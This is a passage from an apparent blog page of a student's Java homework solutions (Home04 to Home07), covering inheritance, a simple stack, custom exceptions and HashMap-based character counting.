class="line">		<span class="comment">//	      = (i-1)!/((j!)*((i-1-j)!))</span></span><br><span class="line">		<span class="comment">//        = (A(i-1-j,i-1)/(A(j,j)	    		  </span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>;j &lt; i/<span class="number">2</span>+<span class="number">1</span>; j++) &#123;</span><br><span class="line">			arr[j] = (<span class="keyword">int</span>)(Math.round((getFac(i-<span class="number">1</span>,i-<span class="number">1</span>-j))/((getFac(j,<span class="number">1</span>)))));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> m = <span class="number">0</span>,n = i-<span class="number">1</span>;n &gt; m;n--,m++) &#123;</span><br><span class="line">			arr[n] = arr[m];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> arr;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Home04"><a href="#Home04" class="headerlink" title="Home04"></a>Home04</h3><ul>
<li><p>A.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h04;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>B.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h04;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">B</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>C.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h04;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>D.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h04;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">D</span> <span class="keyword">extends</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">C</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>E.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h04;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">E</span> <span class="keyword">implements</span> <span class="title">C</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Child.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h04;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">	Child()&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	Child(String a)&#123;</span><br><span class="line">		<span class="keyword">super</span>.name = a;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">speak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"child"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Parent.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h04;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">	String name;</span><br><span class="line">	</span><br><span class="line">	Parent()&#123;</span><br><span class="line">		<span class="comment">//TODO</span></span><br><span class="line">	&#125;</span><br><span class="line">	Parent(String a)&#123;</span><br><span class="line">		name = a;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">speak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"parent"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>MyStack.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyStack</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> size; <span class="comment">// the length of stack</span></span><br><span class="line">	<span class="keyword">int</span> number = <span class="number">0</span>;  <span class="comment">// the number of int</span></span><br><span class="line">	<span class="keyword">int</span>[] list = <span class="keyword">null</span>;</span><br><span class="line">	</span><br><span class="line">	MyStack()&#123;</span><br><span class="line">		size = <span class="number">0</span>;</span><br><span class="line">		number = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	MyStack(<span class="keyword">int</span> size)&#123;</span><br><span class="line">		<span class="keyword">this</span>.size = size;</span><br><span class="line">		number = <span class="number">0</span>;</span><br><span class="line">		list = <span class="keyword">new</span> <span class="keyword">int</span>[size];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> number == <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isFull</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> size == number;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">this</span>.isFull()) <span class="keyword">return</span>;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			list[number++] = n;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">this</span>.isEmpty())	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> list[--number];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Home05"><a href="#Home05" class="headerlink" title="Home05"></a>Home05</h3><h4 id="q01"><a href="#q01" class="headerlink" title="q01"></a>q01</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package com.huawei.classroom.student.h05.q01;</span><br><span class="line">public class Dog &#123;</span><br><span class="line">	int times = 0;</span><br><span class="line">	public void feed()throws Exception &#123;</span><br><span class="line">		System.out.println(times);</span><br><span class="line">		if(times == 3) &#123;</span><br><span class="line">			throw new Exception(&quot;I can not eat more!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		times ++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="q02"><a href="#q02" class="headerlink" title="q02"></a>q02</h4><ul>
<li>LoginUtil.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h05.q02;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginUtil</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">login</span><span class="params">(String a, String b)</span> <span class="keyword">throws</span> InvalidUserExcetpion</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (a.equals(<span class="string">"a"</span>) &amp;&amp; b.equals(<span class="string">"a"</span>)) &#123;</span><br><span class="line">			</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> InvalidUserExcetpion();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="q03"><a href="#q03" class="headerlink" title="q03"></a>q03</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h05.q02;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvalidUserExcetpion</span> <span class="keyword">extends</span> <span class="title">Exception</span></span>&#123;</span><br><span class="line">	InvalidUserExcetpion()&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="q03-1"><a href="#q03-1" class="headerlink" title="q03"></a>q03</h4><ul>
<li><p>Bank.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h05.q03;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bank</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> money = <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Bank</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 初始账户余额为0，每次存款账户余额增加</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> money</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">(<span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.money += money;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 *  </span></span><br><span class="line"><span class="comment">	 * 当账号余额&lt;money的时候，抛出NoMoneyException(NoMoneyException需要你自己定义)</span></span><br><span class="line"><span class="comment">	 * 否则账号余额减少</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> money</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@throws</span> NoMoneyException</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> money)</span> <span class="keyword">throws</span> NoMoneyException </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(money &gt; <span class="keyword">this</span>.money) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> NoMoneyException();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">this</span>.money -= money;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>NoMoneyException.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h05.q03;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NoMoneyException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span>&#123;</span><br><span class="line">	NoMoneyException()&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="q04"><a href="#q04" class="headerlink" title="q04"></a>q04</h4><ul>
<li><p>AgeCheck.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h05.q04;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgeCheck</span> <span class="keyword">implements</span> <span class="title">AgeCheckInterface</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (age &lt; <span class="number">0</span> || age &gt; <span class="number">200</span>) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	AgeCheck()&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>AgeCheckInterface.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h05.q04;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span>  <span class="title">AgeCheckInterface</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="q05"><a href="#q05" class="headerlink" title="q05"></a>q05</h4><ul>
<li>TypeValidator.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h05.q05;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 这个类里面可以增加适当的属性，方法，但是不可以修改现有的方法的声明</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yjn</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TypeValidator</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">TypeValidator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!(obj <span class="keyword">instanceof</span> String)) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Home06"><a href="#Home06" class="headerlink" title="Home06"></a>Home06</h3><ul>
<li>Home06.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.huawei.classroom.student.h06;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 把你作业的代码写到这个类里面</span></span><br><span class="line"><span class="comment"> * 不可以修改类的名字、包名、和固有的几个方法名以及方法的可见性</span></span><br><span class="line"><span class="comment"> * 可以增加其他方法、属性、类</span></span><br><span class="line"><span class="comment"> * 可以引用jdk的类</span></span><br><span class="line"><span class="comment"> * 不要引用jdk1.8以外第三方的包</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yjn</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Home06</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Home06</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 计算出一段文字中不重复的字符的个数，例如“天津市天津大学 ”不重复字符为5</span></span><br><span class="line"><span class="comment">	 * 提示：使用java.util.HashSet </span></span><br><span class="line"><span class="comment">	 * 难度系数1星</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> s</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDistinctCharCount</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		HashSet set = <span class="keyword">new</span> HashSet();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">			set.add(s.charAt(i));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> set.size();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 返回一段文字中，出现频率最高的字符（不考虑并列第一的情况） 例如：getFrequentChar("好好学习") 返回'好'</span></span><br><span class="line"><span class="comment">	 * 例如：getFrequentChar("我是天津大学软件学院学生") 返回'学'</span></span><br><span class="line"><span class="comment">	 * 提示：使用一个长度为65535的数组，或者使用HashMap   </span></span><br><span class="line"><span class="comment">	 * 难度系数2星</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> s</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">getFrequentChar</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">char</span> ans = <span class="string">' '</span>;</span><br><span class="line">		<span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">		HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; s.length();i++) &#123;</span><br><span class="line">			<span class="keyword">char</span> index = s.charAt(i);</span><br><span class="line">			<span class="keyword">if</span>(map.containsKey(s.charAt(i))) &#123;</span><br><span class="line">				map.put(index,(<span class="keyword">int</span>)map.get(index)+<span class="number">1</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				map.put(index,<span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			max = max&gt;(<span class="keyword">int</span>)map.get(index)?max:(<span class="keyword">int</span>)map.get(index);</span><br><span class="line">			ans = max&gt;(<span class="keyword">int</span>)map.get(index)?ans:index;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 返回一段文字中，出现频率最高的词（每个词由2个字符构成，任意两个相邻的字符称为一个词，例如“天津大学，你好”由“天津”“津大”“大学”“学，”“，你”“你好” 6个词构成)</span></span><br><span class="line"><span class="comment">	 * 不会出现频率最高并列的情况</span></span><br><span class="line"><span class="comment">	 * 提示：使用HashMap </span></span><br><span class="line"><span class="comment">	 * 难度系数2星</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> content</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getFrequentWord</span><span class="params">(String content)</span></span>&#123;</span><br><span class="line">		HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">		<span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">		String ans = <span class="string">" "</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; content.length()-<span class="number">1</span>;i++) &#123;</span><br><span class="line">			String key = content.substring(i,i+<span class="number">2</span>);</span><br><span class="line">			<span class="keyword">if</span>(map.containsKey(key)) &#123;</span><br><span class="line">				map.put(key,(<span class="keyword">int</span>)map.get(key)+<span class="number">1</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">				map.put(key, <span class="number">1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			ans = max&gt;(<span class="keyword">int</span>)map.get(key)?ans:key;</span><br><span class="line">			max = Math.max(max, (<span class="keyword">int</span>)map.get(key));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> ans;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 把一个StringBufer中所有的空格去掉</span></span><br><span class="line"><span class="comment">	 * 提示：不能新建StringBuffer对象，必须在原来的基础上删掉原来字符串</span></span><br><span class="line"><span class="comment">	 * 难度系数1星</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> buf</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">zipStringBufer</span><span class="params">(StringBuffer buf)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; buf.length();i++) &#123;</span><br><span class="line">			<span class="keyword">if</span>(buf.charAt(i) == <span class="string">' '</span>) &#123;</span><br><span class="line">				buf.deleteCharAt(i--);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Home07"><a href="#Home07" class="headerlink" title="Home07"></a>Home07</h3><ul>
<li>Analysis.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 